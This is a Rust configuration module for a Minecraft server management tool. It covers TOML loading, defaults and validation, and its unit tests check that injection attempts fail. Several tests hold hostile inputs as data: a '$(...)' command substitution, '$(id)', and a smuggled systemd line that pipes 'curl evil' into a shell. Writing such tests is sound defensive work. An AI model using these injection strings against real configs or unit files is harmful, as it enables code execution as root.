//! `/etc/minecraft/config.toml` — *mc's* configuration.
//!
//! How to run the server: which build, which Java, how much heap, backup
//! policy. The server's OWN settings are not here and never were. Port, seed,
//! MOTD, difficulty and RCON belong to [`crate::properties`], which the JVM
//! reads and rewrites; a game setting mirrored here could only go stale.
//!
//! TOML rather than the shell-sourced `KEY=value` this replaces. That file was
//! *sourced by root*, which made every value a code-execution sink — a newline
//! appended a line of its own and a `$(...)` ran on the next invocation — and
//! the writer had to `printf %q` every field as a last line of defence. A
//! parsed format deletes the whole class.

use serde::{Deserialize, Serialize};

use crate::error::{Error, IoContext, Result};
use crate::java;
use crate::paths::Paths;

/// Which upstream build to install. The set core knows how to fetch itself;
/// anything else arrives through a plugin-provided source.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum ServerType {
    #[default]
    Vanilla,
    Paper,
    Fabric,
    Neoforge,
}

impl ServerType {
    pub fn as_str(&self) -> &'static str {
        match self {
            ServerType::Vanilla => "vanilla",
            ServerType::Paper => "paper",
            ServerType::Fabric => "fabric",
            ServerType::Neoforge => "neoforge",
        }
    }

    pub const ALL: [ServerType; 4] = [
        ServerType::Vanilla,
        ServerType::Paper,
        ServerType::Fabric,
        ServerType::Neoforge,
    ];

    /// True when re-fetching at the same version would be a genuine no-op.
    ///
    /// Only for types whose artifact is fully determined by the version string.
    /// Paper publishes new *builds* against an unchanged Minecraft version, and
    /// Fabric ships new *loader* versions the same way — for those two, "same
    /// version" does not mean "same jar", and skipping would quietly pin the
    /// server to a stale build. The config records only the Minecraft version,
    /// so there is nothing cheaper to compare against for them.
    pub fn version_identifies_artifact(&self) -> bool {
        matches!(self, ServerType::Vanilla | ServerType::Neoforge)
    }
}

impl std::str::FromStr for ServerType {
    type Err = Error;

    fn from_str(s: &str) -> Result<Self> {
        match s.to_ascii_lowercase().as_str() {
            "vanilla" => Ok(ServerType::Vanilla),
            "paper" => Ok(ServerType::Paper),
            "fabric" => Ok(ServerType::Fabric),
            "neoforge" => Ok(ServerType::Neoforge),
            // Named explicitly rather than lumped in with typos: both have a
            // real upstream and operators reasonably expect them to work.
            "forge" | "quilt" => Err(Error::config(format!(
                "Server type '{s}' is not supported yet."
            ))),
            other => Err(Error::config(format!(
                "Unknown server type '{other}'. Known types: vanilla, paper, fabric, neoforge."
            ))),
        }
    }
}

impl std::fmt::Display for ServerType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ServerConfig {
    #[serde(rename = "type")]
    pub server_type: ServerType,
    /// "latest", or a concrete version. Resolved and pinned here at install
    /// time so a later `mc upgrade` can tell whether anything moved.
    pub version: String,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            server_type: ServerType::default(),
            version: "latest".to_string(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct JavaConfig {
    /// Major version to launch with. `None` auto-selects from the Minecraft
    /// version being installed.
    pub version: Option<u32>,
    pub ram: String,
    /// JVM GC flags. Empty auto-configures from the Java version — see
    /// [`crate::java::default_flags`].
    pub flags: Vec<String>,
    /// Extra JVM options, e.g. `-Dfile.encoding=UTF-8`.
    pub opts: Vec<String>,
}

impl Default for JavaConfig {
    fn default() -> Self {
        Self {
            version: None,
            ram: "4G".to_string(),
            flags: Vec::new(),
            opts: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct BackupConfig {
    /// Number of archives to retain. 0 disables rotation.
    pub keep: u32,
    /// systemd `OnCalendar=` syntax.
    pub schedule: String,
}

impl Default for BackupConfig {
    fn default() -> Self {
        Self {
            keep: 7,
            schedule: "daily".to_string(),
        }
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Config {
    pub server: ServerConfig,
    pub java: JavaConfig,
    pub backup: BackupConfig,
}

impl Config {
    /// Load from disk, falling back to defaults when the file does not exist.
    ///
    /// A file that exists but does not parse is an ERROR, not a fallback:
    /// silently running a server on defaults because a typo made the config
    /// unreadable is how an operator ends up with the wrong heap size and no
    /// idea why.
    pub fn load(paths: &Paths) -> Result<Self> {
        let file = paths.config_file();
        match std::fs::read_to_string(&file) {
            Ok(text) => {
                toml::from_str(&text).map_err(|e| Error::config(format!("{}: {e}", file.display())))
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(Error::io(&file, e)),
        }
    }

    pub fn save(&self, paths: &Paths) -> Result<()> {
        self.validate()?;
        let dir = paths.config_dir();
        std::fs::create_dir_all(&dir).at(&dir)?;
        let text = toml::to_string_pretty(self)
            .map_err(|e| Error::other(format!("serialising config: {e}")))?;
        let file = paths.config_file();
        // 0644 root:root: this file has no secrets in it (the RCON password
        // lives in server.passwd) and the unprivileged `mc serve` must read it.
        crate::fsx::write_atomic(&file, &text, None, 0o644)
    }

    /// The Java major version to launch with: the operator's choice, or the one
    /// the configured Minecraft version requires.
    pub fn java_major(&self) -> u32 {
        self.java
            .version
            .unwrap_or_else(|| java::required_major(&self.server.version))
    }

    /// The GC flags to launch with: the operator's, or the preset for this
    /// runtime.
    pub fn java_flags(&self, actual_java_major: u32) -> Vec<String> {
        if self.java.flags.is_empty() {
            java::default_flags(actual_java_major)
        } else {
            self.java.flags.clone()
        }
    }

    /// Reject values that would be unsafe or meaningless downstream.
    pub fn validate(&self) -> Result<()> {
        // backup.schedule is interpolated into a systemd unit drop-in, where
        // TOML quoting is no help — that file is unit syntax, not TOML. A
        // multi-line value could append arbitrary directives to a unit that
        // runs as root. Checked here so a bad value aborts before anything is
        // written, rather than after the drop-in has landed.
        if self.backup.schedule.contains(['\n', '\r']) {
            return Err(Error::config(
                "backup.schedule must be a single line of systemd OnCalendar= syntax.",
            ));
        }
        if self.backup.schedule.trim().is_empty() {
            return Err(Error::config("backup.schedule must not be empty."));
        }
        // -Xmx takes this verbatim. A value the JVM cannot parse is a server
        // that fails to boot with a message about heap sizes rather than about
        // config.
        if !is_jvm_size(&self.java.ram) {
            return Err(Error::config(format!(
                "java.ram must be a JVM size like 4G, 512M or 2048K (got {:?}).",
                self.java.ram
            )));
        }
        Ok(())
    }
}

/// A JVM `-Xmx`-style size: digits followed by an optional K/M/G/T suffix.
fn is_jvm_size(s: &str) -> bool {
    let digits = s
        .strip_suffix(['k', 'K', 'm', 'M', 'g', 'G', 't', 'T'])
        .unwrap_or(s);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn round_trips_through_disk() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(dir.path());

        let mut cfg = Config::default();
        cfg.server.server_type = ServerType::Paper;
        cfg.server.version = "1.21.4".to_string();
        cfg.java.ram = "8G".to_string();
        cfg.java.opts = vec!["-Dfile.encoding=UTF-8".to_string()];
        cfg.backup.keep = 14;

        cfg.save(&paths).unwrap();
        assert_eq!(Config::load(&paths).unwrap(), cfg);
    }

    #[test]
    fn missing_file_is_defaults_but_a_broken_one_is_an_error() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(dir.path());
        assert_eq!(Config::load(&paths).unwrap(), Config::default());

        std::fs::create_dir_all(paths.config_dir()).unwrap();
        std::fs::write(paths.config_file(), "server = [not toml\n").unwrap();
        assert!(matches!(Config::load(&paths), Err(Error::Config(_))));
    }

    #[test]
    fn an_unknown_key_is_reported_not_ignored() {
        // A typo'd key that parses silently is a setting the operator believes
        // is in effect and is not.
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(dir.path());
        std::fs::create_dir_all(paths.config_dir()).unwrap();
        std::fs::write(paths.config_file(), "[java]\nrma = \"8G\"\n").unwrap();

        let err = Config::load(&paths).unwrap_err().to_string();
        assert!(
            err.contains("rma"),
            "error should name the offending key: {err}"
        );
    }

    #[test]
    fn a_shell_metacharacter_is_now_just_a_string() {
        // The file this replaces was SOURCED by root, so this value executed.
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(dir.path());

        let mut cfg = Config::default();
        cfg.java.opts = vec!["-Dfoo=$(touch /tmp/mc-cfg-canary)".to_string()];
        cfg.save(&paths).unwrap();

        let loaded = Config::load(&paths).unwrap();
        assert_eq!(loaded.java.opts, cfg.java.opts);
        assert!(!std::path::Path::new("/tmp/mc-cfg-canary").exists());
    }

    #[test]
    fn a_multiline_schedule_cannot_reach_a_unit_dropin() {
        // The drop-in is systemd unit syntax; TOML quoting protects nothing
        // once the value is written into it. A second line would be an
        // arbitrary directive in a unit that runs as root.
        let mut cfg = Config::default();
        cfg.backup.schedule = "daily\nExecStart=/bin/sh -c 'curl evil|sh'".to_string();
        assert!(matches!(cfg.validate(), Err(Error::Config(_))));

        let dir = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(dir.path());
        assert!(cfg.save(&paths).is_err());
        assert!(
            !paths.config_file().exists(),
            "nothing written on a rejected config"
        );
    }

    #[test]
    fn ram_must_be_a_size_the_jvm_accepts() {
        for good in ["4G", "512M", "2048K", "8g", "1024"] {
            let mut cfg = Config::default();
            cfg.java.ram = good.to_string();
            assert!(cfg.validate().is_ok(), "{good} should be accepted");
        }
        for bad in ["", "lots", "4GB", "-4G", "4 G", "$(id)"] {
            let mut cfg = Config::default();
            cfg.java.ram = bad.to_string();
            assert!(cfg.validate().is_err(), "{bad:?} should be refused");
        }
    }

    #[test]
    fn java_version_falls_back_to_what_minecraft_requires() {
        let mut cfg = Config::default();
        cfg.server.version = "1.21.4".to_string();
        assert_eq!(cfg.java_major(), 21);

        cfg.server.version = "26.2".to_string();
        assert_eq!(cfg.java_major(), 25);

        // An explicit choice wins.
        cfg.java.version = Some(17);
        assert_eq!(cfg.java_major(), 17);
    }

    #[test]
    fn only_fully_pinned_types_can_skip_a_reinstall() {
        // Paper and Fabric publish new builds against an unchanged Minecraft
        // version, so "same version" does not mean "same jar".
        assert!(ServerType::Vanilla.version_identifies_artifact());
        assert!(ServerType::Neoforge.version_identifies_artifact());
        assert!(!ServerType::Paper.version_identifies_artifact());
        assert!(!ServerType::Fabric.version_identifies_artifact());
    }

    #[test]
    fn unsupported_types_are_named_rather_than_lumped_in_with_typos() {
        let err = "forge".parse::<ServerType>().unwrap_err().to_string();
        assert!(err.contains("not supported yet"), "{err}");

        let err = "sponge".parse::<ServerType>().unwrap_err().to_string();
        assert!(err.contains("Known types"), "{err}");
    }
}
